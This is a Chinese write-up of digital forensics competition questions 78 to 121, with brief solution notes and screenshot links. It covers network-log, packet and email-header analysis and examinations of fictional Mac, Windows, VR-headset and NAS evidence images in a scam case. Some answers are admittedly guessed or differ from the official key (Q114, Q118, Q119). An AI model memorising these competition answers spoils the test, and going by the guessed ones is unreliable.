+<h5 id="b.-快速通量dns用于隐藏恶意服务器">B. 快速通量DNS用于隐藏恶意服务器</h5>
+<h5 id="c.-dns缓存投毒用于复位向流量">C. DNS缓存投毒用于复位向流量</h5>
+<h5 id="d.-dns隧道用于数据泄露">D. DNS隧道用于数据泄露</h5>
+<p><img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/104.png"></p>
+<h4 id="单选题在检查内部客户端和外部服务器之间的捕获包您注意到以下transport-layer-securitytls握手消息">78.[单选题]在检查内部客户端和外部服务器之间的捕获包，您注意到以下Transport Layer Security（TLS）握手消息：</h4>
+<pre class="txt"><code>Client Hello：
+Supported Versions：TLS 1.0，TLS 1.1，TLS 1.2 
+Cipher Suites：TLS_RSA_WITH_3DES_EDE_CBC_SHA, TLS_RSA_WITH_RC4_128_SHA
+
+Server Hello：
+Selected Version：TLS 1.0
+Cipher Suite:TLS_RSA_WITH_RC4_128_SHA</code></pre>
+<h5 id="鉴于客户端和服务器都支持更高版本的tls和更强的加密套件下列哪些是降级的合理解释">鉴于客户端和服务器都支持更高版本的TLS和更强的加密套件，下列哪些是降级的合理解释？</h5>
+<h5 id="i.-中间人攻击导致协议降级">i. 中间人攻击导致协议降级。</h5>
+<h5 id="ii.-错误配置导致回退到较弱的加密方式">ii. 错误配置导致回退到较弱的加密方式。</h5>
+<h5 id="iii.-由于客户端与服务器的兼容性问题属于正常操作">iii. 由于客户端与服务器的兼容性问题，属于正常操作。</h5>
+<h5 id="a.-iii-4">A. i&amp;ii</h5>
+<h5 id="b.-只有ii">B. 只有ii</h5>
+<h5 id="c.-只有i">C. 只有i</h5>
+<h5 id="d.-以上皆是">D. 以上皆是</h5>
+<p><img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/105.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/106.png"></p>
+<h4 id="单选题參考以下http访问日誌片段">79.[单选题]參考以下HTTP访问日誌片段：</h4>
+<h5 id="oct2023145536-0000-get-index.html-http1.1-200-1024">192.168.1.1 - - [12/Oct/2023:14:55:36 +0000] “GET /index.html HTTP/1.1” 200 1024</h5>
+<h5 id="oct2023145610-0000-post-login.php-http1.1-200-512">192.168.1.15 - -[12/Oct/2023:14:56:10 +0000] “POST /login.php HTTP/1.1” 200 512</h5>
+<h5 id="oct2023145701-0000-get-admindashboardphp-http1.1-403-256">192.168.1.10 - - [12/Oct/2023:14:57:01 +0000] “GET /admin/dashboarD:php HTTP/1.1” 403 256</h5>
+<h5 id="oct2023145825-0000-get-index.html-http1.1-200-1024">192.168.1.20 - - [12/Oct/2023:14:58:25 +0000] “GET /index.html HTTP/1.1” 200 1024</h5>
+<h5 id="哪个ip地址试图访问受限页面">哪个IP地址试图访问受限页面？</h5>
+<h5 id="a.-192.168.1.15">A. 192.168.1.15</h5>
+<h5 id="b.-192.168.1.10">B. 192.168.1.10</h5>
+<h5 id="c.-192.168.1.20">C. 192.168.1.20</h5>
+<h5 id="d.-192.168.1.1">D. 192.168.1.1</h5>
+<p>这题倒是可以直接看，学http的时候学过，403表示受限。</p>
+<h4 id="单选题參考以下网络数据包捕获的十六进制部分">80.[单选题]參考以下网络数据包捕获的十六进制部分：</h4>
+<h5 id="a-a0-b0-c0-d0-00-1b-c1-d1-e1-f1-08-00-45-00">0000 00 1a a0 b0 c0 d0 00 1b c1 d1 e1 f1 08 00 45 00</h5>
+<h5 id="c-1c-46-40-00-40-06-a6-ec-c0-a8-01-0a-c0-a8">0010 00 3c 1c 46 40 00 40 06 a6 ec c0 a8 01 0a c0 a8</h5>
+<h5 id="d1-5c-1a-2b-3c-4d-5e-6f-70-80-90-a0-0030-b0-c0-d0-e0-f0-00-00-00-00-50-02-20-00-b5-e2-00">0020 01 14 00 50 d1 5c 1a 2b 3c 4d 5e 6f 70 80 90 a0 0030 b0 c0 d0 e0 f0 00 00 00 00 50 02 20 00 b5 e2 00</h5>
+<h5 id="数据包的源ip地址是什么">数据包的源IP地址是什么？</h5>
+<h5 id="a.-192.168.1.10">A. 192.168.1.10</h5>
+<h5 id="b.-192.168.1.20">B. 192.168.1.20</h5>
+<h5 id="c.-10.0.0.1">C. 10.0.0.1</h5>
+<h5 id="d.-172.16.0.1">D. 172.16.0.1</h5>
+<p><img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/108.png"></p>
+<h4 id="单选题题目见描述">81.[单选题]题目见描述</h4>
+<p>參考以下Wireshark捕获摘要:</p>
+<table style="width:38%;">
+<colgroup>
+<col style="width: 5%">
+<col style="width: 4%">
+<col style="width: 5%">
+<col style="width: 5%">
+<col style="width: 5%">
+<col style="width: 5%">
+<col style="width: 5%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>No.</th>
+<th>Time</th>
+<th>Source</th>
+<th>Destination</th>
+<th>Protocol</th>
+<th>Length</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>1</td>
+<td>0.000000</td>
+<td>192.168.1.10</td>
+<td>192.168.1.255</td>
+<td>ARP</td>
+<td>42</td>
+<td>Who has 192.168.1.255? Tell 192.168.1.10</td>
+</tr>
+<tr class="even">
+<td>2</td>
+<td>0.005000</td>
+<td>192.168.1.20</td>
+<td>192.168.1.10</td>
+<td>ICMP</td>
+<td>98</td>
+<td>Echo (ping) request</td>
+</tr>
+<tr class="odd">
+<td>3</td>
+<td>0.010000</td>
+<td>192.168.1.10</td>
+<td>192.168.1.20</td>
+<td>ICMP</td>
+<td>98</td>
+<td>Echo (ping) reply</td>
+</tr>
+<tr class="even">
+<td>4</td>
+<td>0.020000</td>
+<td>192.168.1.30</td>
+<td>192.168.1.10</td>
+<td>TCP</td>
+<td>66</td>
+<td>12345 &gt; 80 [SYN] Seq=0 Win=64240 MSS=1460</td>
+</tr>
+<tr class="odd">
+<td>5</td>
+<td>0.025000</td>
+<td>192.168.1.10</td>
+<td>192.168.1.30</td>
+<td>TCP</td>
+<td>66</td>
+<td>80 &gt; 12345 [SYN, ACK] Seq=0 Ack=1 Win=64240 MSS=1460</td>
+</tr>
+<tr class="even">
+<td>6</td>
+<td>0.030000</td>
+<td>192.168.1.30</td>
+<td>192.168.1.10</td>
+<td>TCP</td>
+<td>54</td>
+<td>12345 &gt; 80 [ACK] Seq=1 Ack=1 Win=64240</td>
+</tr>
+</tbody>
+</table>
+<h6 id="描述此捕获中发生的事件顺序">描述此捕获中发生的事件顺序｡</h6>
+<h5 id="a.-ping请求后发送arp请求">A. Ping请求后发送ARP请求</h5>
+<h5 id="b.-arp请求ping交换和tcp握手">B. ARP请求、Ping交换和TCP握手</h5>
+<h5 id="c.-tcp握手后发送arp请求">C. TCP握手后发送ARP请求</h5>
+<h5 id="d.-仅存在icmp流量">D. 仅存在ICMP流量</h5>
+<p><img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/109.png"></p>
+<h4 id="单选题题目见描述-1">82. [单选题]题目见描述</h4>
+<h5 id="參考服务器上netstat命令的以下输出">參考服务器上netstat命令的以下输出：</h5>
+<h5 id="active-internet-connections-servers-and-established">Active Internet connections (servers and established)</h5>
+<h5 id="proto-recv-q-send-q-local-address-foreign-address-state">Proto Recv-Q Send-Q Local Address Foreign Address State</h5>
+<h5 id="tcp-0-0-0.0.0.022-0.0.0.0-listen">tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN</h5>
+<h5 id="tcp-0-0-192.168.1.1022-203.0.113.2054321-established">tcp 0 0 192.168.1.10:22 203.0.113.20:54321 ESTABLISHED</h5>
+<h5 id="tcp-0-0-192.168.1.1080-198.51.100.512345-established">tcp 0 0 192.168.1.10:80 198.51.100.5:12345 ESTABLISHED</h5>
+<h5 id="tcp-0-0-192.168.1.10443-203.0.113.2523456-established">tcp 0 0 192.168.1.10:443 203.0.113.25:23456 ESTABLISHED</h5>
+<h5 id="哪些服务当前正在服务器上运行并监听">哪些服务当前正在服务器上运行并监听？</h5>
+<h5 id="a.-在80端口上的ssh和54321端口上的http">A. 在80端口上的SSH和54321端口上的HTTP</h5>
+<h5 id="b.-仅在22端口上的ssh">B. 仅在22端口上的SSH</h5>
+<h5 id="c.-在22端口上的ssh12345端口上的http以及443端口上的https">C. 在22端口上的SSH，12345端口上的HTTP，以及443端口上的HTTPS</h5>
+<h5 id="d.-仅在23456端口上的https">D. 仅在23456端口上的HTTPS</h5>
+<p><img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/110.png"></p>
+<h4 id="单选题参考以下电子邮件头信息">83.[单选题]参考以下电子邮件头信息：</h4>
+<h5 id="fromjohn-doe-john.doeexample.com-tojane-smith-jane.smithcompany.com-datethu-12-oct-2023-190000-0000-subjectimportant-update-receivedfrom-unknown-helo-mail.example.com-192.0.2.10-by-mail.company.com-with-smtp-thu-12-oct-2023-190005-0000-x-mailerphpmailer-5.2">From:“John Doe” john.doe@example.com To:“Jane Smith” jane.smith@company.com Date:Thu, 12 Oct 2023 19:00:00 +0000 Subject:Important Update Received:from unknown (HELO mail.example.com) (192.0.2.10) by mail.company.com with SMTP; Thu, 12 Oct 2023 19:00:05 +0000 X-Mailer:PHPMailer 5.2</h5>
+<h5 id="识别可能表明电子邮件被伪造的任何异常">识别可能表明电子邮件被伪造的任何异常。</h5>
+<h5 id="a.-使用了phpmailer-5.2">A. 使用了PHPMailer 5.2</h5>
+<h5 id="b.-电子邮件头部显示未知发件人">B. 电子邮件头部显示未知发件人</h5>
+<h5 id="c.-电子邮件在190000发送但在190005接收">C. 电子邮件在19:00:00发送，但在19:00:05接收</h5>
+<h5 id="d.-主题是重要更新">D. 主题是“重要更新”</h5>
+<p><img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/111.png"></p>
+<h4 id="单选题在网络取证中您会检查tcpip数据包中的哪个字段来验证数据在传输过程中是否受到了破坏">84.[单选题]在网络取证中，您会检查TCP/IP数据包中的哪个字段来验证数据在传输过程中是否受到了破坏？</h4>
+<h5 id="a.-tcp序列号">A. TCP序列号</h5>
+<h5 id="b.-数据包大小">B. 数据包大小</h5>
+<h5 id="c.-校验和checksum">C. 校验和（Checksum）</h5>
+<h5 id="d.-目标端口">D. 目标端口</h5>
+<p>这题常识一点，选C。</p>
+<h4 id="单选题以下哪个特征最能表明僵尸网络中的指挥与控制c2通信">85.[单选题]以下哪个特征最能表明僵尸网络中的指挥与控制（C2）通信？</h4>
+<h5 id="a.-高频率的dns查询到热门域名">A. 高频率的DNS查询到热门域名</h5>
+<h5 id="b.-数据包传至255.255.255.255">B. 数据包传至255.255.255.255</h5>
+<h5 id="c.-与远程服务器进行定期周期性通信">C. 与远程服务器进行定期周期性通信</h5>
+<h5 id="d.-使用ftp协议进行过多的文件传输请求">D. 使用FTP协议进行过多的文件传输请求</h5>
+<p><img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/112.png"></p>
+<h4 id="单选题在ip封包分析中哪一個數值最能夠協助推斷封包經過的距離">86.[单选题]在IP封包分析中，哪一個數值最能夠協助推斷封包經過的距離？</h4>
+<h5 id="a.-由于路由无响应导致的数据包丢失增加">A. 由于路由无响应导致的数据包丢失增加</h5>
+<h5 id="b.-ip封包中的ttl值">B. IP封包中的TTL值</h5>
+<h5 id="c.-icmp回显回复中不匹配的序列号">C. ICMP回显回复中不匹配的序列号</h5>
+<h5 id="d.-路由器级别检查ip选项字段的异常">D. 路由器级别检查IP选项字段的异常</h5>
+<p><img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/113.png"></p>
+<h3 id="alice的mac笔记本电脑"><em>Alice的Mac笔记本电脑</em></h3>
+<h4 id="单选题通过从跳转站获得的信息ben_jumpstation.zip你认为alice的笔记本电脑可能包含与犯罪相关的更多信息你建议调查员进一步扣押alice的笔记本电脑进行分析参考alice_macbook.e01计算机名称是">87.[单选题]通过从跳转站获得的信息（Ben_Jumpstation.zip），你认为Alice的笔记本电脑可能包含与犯罪相关的更多信息。你建议调查员进一步扣押Alice的笔记本电脑进行分析。参考Alice_Macbook.e01，计算机名称是？</h4>
+<h5 id="a.-alices-macbook-pro">A. Alice’s MacBook Pro</h5>
+<h5 id="b.-alices-laptop">B. Alice’s Laptop</h5>
+<h5 id="c.-alices-mac">C. Alice’s Mac</h5>
+<h5 id="d.-alices-macbook">D. Alice’s MacBook</h5>
+<p>系统信息里直接看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/1.png"></p>
+<h4 id="填空题参考alice_macbook.e01alice的计算机运行的macos-monterey版本是答案格式123.456.789">88.[填空题]参考Alice_Macbook.e01，Alice的计算机运行的macOS Monterey版本是？（答案格式：123.456.789）</h4>
+<p>这里系统信息里直接看是12.7.6，比答案进了一个版本，看了师傅们的wp的解释是这里是因为系统准备了12.7.6的更新但是还没有开始，所以其中的preboot卷已经覆盖但是系统还是12.7.5，这里也可以仿真起来看到系统的版本号。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/2.png"></p>
+<p>这里我没有仿真，后面在系统安装里面找到了，12.7.5是最新安装的，12.7.6没有。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/5.png"></p>
+<h4 id="填空题参考alice_macbook.e01alice的计算机的en0-mac地址是答案格式xxxxxxxxxxxx小写英文字母和阿拉伯数字混合组成">89.[填空题]参考Alice_Macbook.e01，Alice的计算机的EN0 MAC地址是？（答案格式：xx:xx:xx:xx:xx:xx，小写英文字母和阿拉伯数字混合组成）</h4>
+<p>补一个知识点：<strong>在 macOS系统中，en0是一个网络接口的标识符。</strong></p>
+<p>所以在网络接口里找。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/3.png"></p>
+<h4 id="填空题参考alice_macbook.e01alice在2024年8月19日收到了一个包含15个人个人资料的excel文件她是从哪一个平台下载这个文件的">90.[填空题]参考Alice_Macbook.e01，Alice在2024年8月19日收到了一个包含15个人个人资料的Excel文件，她是从哪一个平台下载这个文件的？</h4>
+<p>表格里找到对应时间的文件，这个前面做到过，是在WhatsApp里下的。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/4.png"></p>
+<h4 id="填空题承上题参考alice_macbook.e01alice是何时在她的mac上安装了上述应用程序答案格式yyyy-mm-dd-hhmm">91.[填空题]承上题，参考Alice_Macbook.e01，Alice是何时在她的Mac上安装了上述应用程序？（答案格式：YYYY-MM-DD HH:MM）</h4>
+<p>直接时间线里搜WhatsApp，9点那个时候是下载，10点才安装好。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/6.png"></p>
+<h4 id="填空题参考alice_macbook.e01alice在2024年8月19日在计算机上截取了两张屏幕截图都是关于安置客服人员的电骗中心位置她是使用哪个浏览器来搜索这个位置">92.[填空题]参考Alice_Macbook.e01，Alice在2024年8月19日在计算机上截取了两张屏幕截图，都是关于安置客服人员的电骗中心位置，她是使用哪个浏览器来搜索这个位置？</h4>
+<p>这里我没去找截图，直接浏览器看谷歌里有用到地图。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/7.png"></p>
+<h4 id="填空题参考alice_macbook.e01她的计算机的team-viewer-clientid是多少答案格式只需使用阿拉伯数字回答">93.[填空题]参考Alice_Macbook.e01，她的计算机的Team Viewer ClientID是多少？（答案格式：只需使用阿拉伯数字回答）</h4>
+<p>这个也可以直接看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/8.png"></p>
+<h4 id="单选题参考alice_macbook.e01alice曾经登录teamviewer并获取一个包含个人数据的excel文件alice是透过以下哪一个方法登录teamviewer以获取该文件">94.[单选题]参考Alice_Macbook.e01，Alice曾经登录Teamviewer并获取一个包含个人数据的excel文件，Alice是透过以下哪一个方法登录Teamviewer以获取该文件？</h4>
+<h5 id="a.-teamviewer-desktop-application">A. Teamviewer Desktop Application</h5>
+<h5 id="b.-web.teamviewer.com">B. web.teamviewer.com</h5>
+<h5 id="c.-anydesk">C. Anydesk</h5>
+<h5 id="d.-以上皆不是-2">D. 以上皆不是</h5>
+<p>这个浏览器里看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/10.png"></p>
+<h4 id="单选题承上题上述包含个人数据文件的文件名是">95.[单选题]承上题，上述包含个人数据文件的文件名是？</h4>
+<h5 id="a.-newfile.xlsx">A. newfile.xlsx</h5>
+<h5 id="b.-personal_data.xlsx">B. personal_data.xlsx</h5>
+<h5 id="c.-personal_details_2.xlsx">C. Personal_details_2.xlsx</h5>
+<h5 id="d.-kingsoft_et_stocka.xlsx">D. Kingsoft_Et_Stocka.xlsx</h5>
+<p>这个把登录时间和文件的创建时间对应一下，只有一个对得上。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/9.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/11.png"></p>
+<h4 id="填空题承上题参考alice_macbook.e01alice是何时通过teamviewer获取上述包含个人资料的文件的答案格式yyyy-mm-dd-hhmm">96.[填空题]承上题，参考Alice_Macbook.e01，Alice是何时通过Teamviewer获取上述包含个人资料的文件的？（答案格式：YYYY-MM-DD HH:MM）</h4>
+<p>直接就是上面的创建时间。</p>
+<h4 id="填空题参考alice_macbook.e01alice透过teamviewer连接另一台计算机以获取文件的teamviewer-id是多少答案格式只需使用阿拉伯数字回答">97.[填空题]参考Alice_Macbook.e01，Alice透过Teamviewer连接另一台计算机以获取文件的Teamviewer ID是多少？（答案格式：只需使用阿拉伯数字回答）</h4>
+<p>看URL。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/12.png"></p>
+<h3 id="john的windows笔记本电脑"><em>John的Windows笔记本电脑</em></h3>
+<h4 id="填空题同样跳转站ben_jumpstation.zip也指向一些可能从john的桌面计算机获取的关键信息参考john_desktop.e01系统最后关机时间是答案格式yyyy-mm-dd-hhmmss">98.[填空题]同样，跳转站（Ben_Jumpstation.zip）也指向一些可能从John的桌面计算机获取的关键信息。参考John_Desktop.e01，系统最后关机时间是？（答案格式：YYYY-MM-DD HH:MM:SS）</h4>
+<p>直接看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/13.png"></p>
+<h4 id="单选题参考john_desktop.e01系统连接usb-sandisk-3.2gen-1其序列号是">99.[单选题]参考John_Desktop.E01，系统连接USB SanDisk 3.2Gen 1，其序列号是？</h4>
+<h5 id="a.01010de54f417fee2292cb6b6ed760608009cace6e76a">A.01010de54f417fee2292cb6b6ed760608009cace6e76a</h5>
+<h5 id="b.d9644b9861a106c9db4fd4599863c856c6789384b">B.D9644B9861A106C9DB4FD4599863C856C6789384B</h5>
+<h5 id="c.4f7b6f8fc20f74329994f7d3fac6920a8d0ecd33fabad423">C.4f7b6f8fc20f74329994f7d3fac6920a8d0ecd33fabad423</h5>
+<h5 id="d.8fe24bf440f2def1c5182e1a27a4c183f5d6024b758c803">D.8fe24bf440f2def1c5182e1a27a4c183f5d6024b758c803</h5>
+<p>USB设备这边直接看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/14.png"></p>
+<h4 id="判断题参考john_desktop.e01于2024年8月28日13时57分21john曾连接过meta-quest-3吗">100.[判断题]参考John_Desktop.e01，于2024年8月28日13时57分21，John曾连接过Meta Quest 3吗？</h4>
+<p>连接那就USB这边看，可以看到这个时间还是没有弹出的那就是在连接。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/16.png"></p>
+<h4 id="填空题参考john_desktop.e01john在何时打开了joshe-investment.jpg文件答案格式yyyy-mm-dd-hhmmss">101.[填空题]参考John_Desktop.E01，John在何时打开了Joshe Investment.JPG文件？（答案格式:YYYY-MM-DD HH:MM:SS）</h4>
+<p>这里我搜文件只能搜索到个快捷方式。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/15.png"></p>
+<p>后面好像是意外找到的在访问记录这里（？ <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/17.png"></p>
+<h4 id="填空题参考john_desktop.e01用户-desktop-hdkjijj的安全标识符sid是答案格式大写英文字母阿拉伯数字和符号一混合组成">102.[填空题]参考John_Desktop.e01，用户 “DESKTOP-HDKJIJJ”的安全标识符（SID）是？（答案格式:大写英文字母，阿拉伯数字和符号一混合组成）</h4>
+<p>直接看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/18.png"></p>
+<h4 id="单选题参考john_desktop.e01有多少个用户帐户是停用disabled">103.[单选题]参考John_Desktop.e01，有多少个用户帐户是停用（disabled）？</h4>
+<p>依旧账户这里看，这四个都是无效的。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/19.png"></p>
+<h4 id="填空题参考john_desktop.e01该计算机被动态主机配置协议dhcp所分配的ip位址是答案格式123.123.123.123">104.[填空题]参考John_Desktop.E01，该计算机被动态主机配置协议（DHCP）所分配的IP位址是？（答案格式:123.123.123.123）</h4>
+<p>网络这里看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/20.png"></p>
+<h4 id="单选题参考john_desktop.e01-df_2024_08_29_10_01_27_906.mp4是什么类型的视频">105.[单选题]参考John_Desktop.E01， DF_2024_08_29_10_01_27_906.mp4是什么类型的视频？</h4>
+<h5 id="a.-自我介绍">A. 自我介绍</h5>
+<h5 id="b.-产品锁售">B. 产品锁售</h5>
+<h5 id="c.-深伪视频">C. 深伪视频</h5>
+<h5 id="d.-足球比赛">D. 足球比赛</h5>
+<p>视频找到之后看了一下特别卡顿，他叽里呱啦一顿英文我也没听懂……反正就是ai换脸了。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/21.png"></p>
+<h3 id="john的vr文件"><em>John的VR文件</em></h3>
+<h4 id="单选题在搜査john住所期间调査员检取了一副虚疑景-vr-眼鏡进行了取证检査参考quest_3_2g0yc5zfb307d7.zip文件虚疑景-vr-眼鏡有多少个使用者">106.[单选题]在搜査John住所期间，调査员检取了一副虚疑景 （VR） 眼鏡进行了取证检査。参考Quest_3_2G0YC5ZFB307D7.zip文件，虚疑景 （VR） 眼鏡有多少个使用者？</h4>
+<h5 id="a.-1-4">A. 1</h5>
+<h5 id="b.-2-3">B. 2</h5>
+<h5 id="c.-3-2">C. 3</h5>
+<h5 id="d.-4-2">D. 4</h5>
+<p>VR相关的这些题直接文件里找了就，这个在user相关的文档里找，就一个人。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/22.png"></p>
+<h4 id="单选题参考quest_3_2g0vc5zfb307d7.zipvr眼鏡默认安装了什么即时通讯软件lnstant-messaging-app">107.[单选题]参考Quest_3_2G0VC5ZFB307D7.zip，VR眼鏡默认安装了什么即时通讯软件（lnstant Messaging App）？</h4>
+<h5 id="a.-wechat">A. WeChat</h5>
+<h5 id="b.-line">B. LINE</h5>
+<h5 id="c.-whatsapp">C. WhatsApp</h5>
+<h5 id="d.-telegram">D. Telegram</h5>
+<p>这个文档是安装app相关的文档，每个选项挨个搜过去就好。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/23.png"></p>
+<h4 id="填空题参考quest_3_2g0yc5zfb307d7.zip虛疑實景vr眼鏡应用程序gun-raiders的版本是答案格式1.2.3">108.[填空题]参考Quest_3_2G0YC5ZFB307D7.zip，虛疑實景（VR）眼鏡应用程序“Gun Raiders”的版本是？（答案格式：1.2.3）</h4>
+<p>直接搜关键字raiders，第一行出现的地方向下搜索version。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/24.png"></p>
+<h4 id="判断题参考quest_3_2g0yc5zfb307d7.zipvr眼镜应用程序gun-raiders可以启动设备发现或操纵蓝牙">109.[判断题]参考Quest_3_2G0YC5ZFB307D7.zip，VR眼镜应用程序“Gun Raiders”，可以启动设备发现或操纵蓝牙</h4>
+<p>这个直接向下搜索Bluetooth。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/25.png"></p>
+<h4 id="填空题参考quest_3_2g0yc5zfb307d7.zip在dcim文件夹内vr眼镜有多少视频的文件修改时间是2024年8月13日答案格式请以阿拉伯数字作答">110.[填空题]参考Quest_3_2G0YC5ZFB307D7.zip，在DCIM文件夹内，VR眼镜有多少视频的文件修改时间是2024年8月13日？（答案格式：请以阿拉伯数字作答）</h4>
+<p>按时间排序一下，这三张照片。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/26.png"></p>
+<h4 id="填空题参考quest_3_2g0yc5zfb307d7.zip在提供的网络信息中虛疑實景vr眼鏡wlan0-网络接口的ipv4地址是答案格式123.123.123.123">111.[填空题]参考Quest_3_2G0YC5ZFB307D7.zip，在提供的网络信息中，虛疑實景（VR）眼鏡’wlan0’ 网络接口的IPv4地址是？（答案格式：123.123.123.123）</h4>
+<p>网络配置文档里看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/27.png"></p>
+<h3 id="john的nas设备文件"><em>John的NAS设备文件</em></h3>
+<h4 id="单选题除了以上john的所有设备之外调查员还发现了一台nas存储设备并转交你进行分析参考john_nas_1.e01和john_nas_2.e01它是哪一种独立磁盘冗余阵列raid">112.[单选题]除了以上John的所有设备之外，调查员还发现了一台NAS存储设备，并转交你进行分析。参考John_NAS_1.E01和John_NAS_2.E01，它是哪一种独立磁盘冗余阵列（RAID）？</h4>
+<h5 id="a.-raid-0">A. RAID 0</h5>
+<h5 id="b.-raid-1">B. RAID 1</h5>
+<h5 id="c.-raid-5">C. RAID 5</h5>
+<h5 id="d.-以上皆不是-3">D. 以上皆不是</h5>
+<p>这个NAS取证我钻研了很久怎么把这两个RAID重组但依旧没有战胜orz，只能做些只看文件就能做的题了。</p>
+<p>钻研过程中这个镜像文件点开发现有一行注释写了是RAID 0。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/28.png"></p>
+<h4 id="判断题参考john_nas_1.e01和john_nas_2.e01该nas的容量有512gb">113.[判断题]参考John_NAS_1.E01和John_NAS_2.E01，该NAS的容量有512GB</h4>
+<p>火眼里面可以信息基础扫描，这两个加起来是426G左右。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/29.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/30.png"></p>
+<h4 id="单选题参考john_nas_1.e01-和john_nas_2.e01该nas的可用空间有多少">114.[单选题]参考John_NAS_1.E01 和John_NAS_2.E01，该NAS的可用空间有多少？</h4>
+<h5 id="a.-512gb">A. 512GB</h5>
+<h5 id="b.-426gb">B. 426GB</h5>
+<h5 id="c.-417gb">C. 417GB</h5>
+<h5 id="d.-9.4gb">D. 9.4GB</h5>
+<p>这个因为我没把两个文件重组所以没做出来……但答案基本可以CD二选一，如果去掉容器占的内存应该只用了10个G左右<del>（其实只是在对着答案瞎分析。</del> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/31.png"></p>
+<h4 id="判断题参考john_nas_1.e01和john_nas_2.e01该nas的文件系统格式是ext3">115.[判断题]参考John_NAS_1.E01和John_NAS_2.E01，该NAS的文件系统格式是EXT3</h4>
+<p>上面那张图里有，是EXT4。</p>
+<h4 id="单选题参考john_nas_1.e01和john_nas_2.e01该nas的用户人数有多少个">116.[单选题]参考John_NAS_1.E01和John_NAS_2.E01，该NAS的用户人数有多少个？</h4>
+<h5 id="a.-1-5">A. 1</h5>
+<h5 id="b.-2-4">B. 2</h5>
+<h5 id="c.-3-3">C. 3</h5>
+<h5 id="d.-4-3">D. 4</h5>
+<p>这个因为没有重组成功所以没做出来orz。</p>
+<h4 id="单选题参考john_nas_1.e01和john_nas_2.e01该nas内有多少张圖片标示this-is-a-child-porn-photo">117.[单选题]参考John_NAS_1.E01和John_NAS_2.E01，该NAS内有多少张圖片标示’This is a Child PORN PHOTO’？</h4>
+<h5 id="a.-1-6">A. 1</h5>
+<h5 id="b.-2-5">B. 2</h5>
+<h5 id="c.-3-4">C. 3</h5>
+<h5 id="d.-4-4">D. 4</h5>
+<p>这个在做VR文件里的时候有看到，应该图片是一样的，但这里有个坑点，就是其他三张图片里面的英文有大小写区别，不仔细看还以为是一样的…… <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/44.png"></p>
+<h4 id="填空题参考john_nas_1.e01-和john_nas_2.e01视频ing_vid_8081695_10s.mp4在什么时候放进nas内答案格式yyyy-mm-dd-hhmmss">118.[填空题]参考John_NAS_1.E01 和John_NAS_2.E01，视频ING_VID_8081695_10s.mp4在什么时候放进NAS内？（答案格式:YYYY-MM-DD HH:MM:SS）</h4>
+<p>反正这个文件电脑里肯定有，直接把修改时间当答案了:D。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/33.png"></p>
+<h4 id="填空题参考john_nas-1.e01和john_nas_2.e01dcdb711a52a94fe9b6eb742a6919410d.mp4是在哪个网站下载的答案格式www.abcd.com">119.[填空题]参考John_NAS 1.E01和John_NAS_2.E01，dcdb711a52a94fe9b6eb742a6919410D.mp4是在哪个网站下载的？（答案格式：www.abcd.com）</h4>
+<p>这个找到图片后看元数据，但好像和答案不一样。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/32.png"></p>
+<h4 id="填空题参考john_desktop.e01john访问nas的网络地址是答案格式123.123.123.123">120.[填空题]参考John_Desktop.E01，John访问NAS的网络地址是？（答案格式：123.123.123.123）</h4>
+<p>这个在网络里看，后面的ID和我也不知道怎么分析出来的NAS的ID对上了那就是这个了:D。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/34.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/87-130/45.png"></p>
+<h4 id="单选题参考john_desktop.e01该nas的网络驱动器盘符network-drive-letter是">121.[单选题]参考John_Desktop.E01，该NAS的网络驱动器盘符（Network Drive Letter）是？</h4>
+<h5 id="a.-a">A. A</h5>
+<h5 id="b.-c">B. C</h5>
+<h5 id="c.-z">C. Z</h5>
